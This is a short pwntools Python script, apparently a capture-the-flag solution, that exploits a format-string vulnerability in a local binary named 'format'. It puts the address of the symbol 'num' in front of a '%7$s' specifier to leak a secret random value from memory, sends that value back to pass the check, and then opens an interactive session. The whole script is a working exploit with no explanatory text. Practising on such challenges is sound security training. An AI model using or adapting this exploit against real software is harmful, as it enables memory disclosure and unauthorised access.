from pwn import*
context.log_level = 'debug'
o = process("./format")
elf = ELF("./format")

num = elf.sym['num']
payload = p32(num) + b"%7$s"
pause()
o.sendline(payload)
o.recvuntil(p32(num))
rand = u32(o.recv(4))
print(hex(rand))
o.sendline(str(rand))

o.interactive()
